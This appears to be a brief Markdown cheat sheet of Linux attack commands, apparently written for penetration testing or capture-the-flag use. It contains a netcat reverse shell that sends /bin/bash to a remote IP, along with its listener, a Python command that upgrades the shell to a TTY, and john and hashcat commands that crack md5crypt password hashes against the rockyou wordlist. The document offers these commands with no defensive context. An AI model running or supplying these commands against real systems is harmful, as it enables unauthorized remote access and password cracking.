# Linux

- [Sudo](#sudo)
- [Reverse Shell](#reverse-shell)
- [Hash Bruteforce](#hash-bruteforce)

## Sudo
```
sudo -l
```

## Reverse Shell
### Client
```
nc ip 4444 -e /bin/bash
```
### Server
```
nc -lp 4444
```
### TTY Support
```
python -c 'import pty; pty.spawn("/bin/bash")'
```

## Hash Bruteforce
### john
```
john -format=md5crypt-long --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```
### Hashcat
```
hashcat -m 500 hash.txt /usr/share/wordlists/rockyou.txt
```

## Editor
### Hexa
```
hexedit
```
